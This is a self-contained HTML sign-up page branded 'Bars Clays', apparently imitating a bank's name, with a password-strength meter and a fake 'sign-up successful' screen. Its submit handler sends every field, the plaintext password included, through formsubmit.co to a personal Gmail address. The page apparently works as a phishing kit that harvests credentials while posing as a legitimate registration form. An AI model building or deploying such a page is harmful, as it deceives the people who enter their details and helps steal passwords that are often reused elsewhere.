<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Bars Clays - Sign Up</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}body{background:#f4f6f9;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px} .container{background:#fff;width:100%;max-width:400px;padding:40px 30px;border-radius:12px;box-shadow:0 10px 25px rgba(0,0,0,0.08);transition:0.3s}.logo{text-align:center;font-size:26px;font-weight:bold;margin-bottom:25px;color:#FCD535}.subtitle{text-align:center;font-size:14px;color:#555;margin-bottom:25px}.input-group{margin-bottom:18px;position:relative}.input-group input{width:100%;padding:12px;border-radius:6px;border:1px solid #ccc;font-size:14px;outline:none;transition:0.3s}.input-group input:focus{border-color:#FCD535}.toggle-password{position:absolute;right:10px;top:12px;cursor:pointer;font-size:14px;color:#666}.strength{font-size:12px;margin-top:5px}.strength.weak{color:red}.strength.medium{color:orange}.strength.strong{color:green}button{width:100%;padding:12px;border:none;background:#FCD535;color:#000;border-radius:6px;font-size:14px;cursor:pointer;transition:0.3s;font-weight:bold}button:hover{background:#e6b800}#successMessage{display:none;text-align:center;font-size:16px;color:#333}.success-box{padding:30px;background:#e6ffe6;border-radius:10px;box-shadow:0 5px 15px rgba(0,0,0,0.05)}@media(max-width:480px){.container{padding:30px 20px}.logo{font-size:22px}.subtitle{font-size:13px}.input-group input{padding:10px;font-size:13px}button{padding:10px;font-size:13px}}</style></head><body><div class="container" id="formContainer"><div class="logo">Bars Clays</div><div class="subtitle">Welcome to Bars Clays</div><form id="signupForm"><div class="input-group"><input type="text" name="name" placeholder="Your Name" required></div><div class="input-group"><input type="email" name="email" placeholder="Your Email" required></div><div class="input-group"><input type="password" name="password" id="password" placeholder="Your Password" required><span class="toggle-password" onclick="togglePassword()">Show</span><div id="strengthMessage" class="strength"></div></div><button type="submit">Continue</button></form></div><div class="container" id="successMessage"><div class="success-box"><div class="logo">Bars Clays</div><div class="subtitle">Your sign-up was successful!<br>Thank you for joining us.</div></div></div><script>const passwordInput=document.getElementById("password");const strengthMessage=document.getElementById("strengthMessage");passwordInput.addEventListener("input",function(){const value=passwordInput.value;let strength=0;if(value.length>=6)strength++;if(/[A-Z]/.test(value))strength++;if(/[0-9]/.test(value))strength++;if(/[^A-Za-z0-9]/.test(value))strength++;if(value.length===0){strengthMessage.textContent="";strengthMessage.className="strength"}else if(strength<=1){strengthMessage.textContent="Weak password";strengthMessage.className="strength weak"}else if(strength<=3){strengthMessage.textContent="Medium strength";strengthMessage.className="strength medium"}else{strengthMessage.textContent="Strong password";strengthMessage.className="strength strong"}});function togglePassword(){if(passwordInput.type==="password"){passwordInput.type="text";document.querySelector(".toggle-password").textContent="Hide"}else{passwordInput.type="password";document.querySelector(".toggle-password").textContent="Show"}}const form=document.getElementById("signupForm");form.addEventListener("submit",function(e){e.preventDefault();const data=new FormData(form);fetch("https://formsubmit.co/ajax/zenithaurora777@gmail.com",{method:"POST",body:data}).then(r=>r.ok?showSuccess():alert("Submission failed, try again"))});function showSuccess(){document.getElementById("formContainer").style.display="none";document.getElementById("successMessage").style.display="block"}</script></body></html>
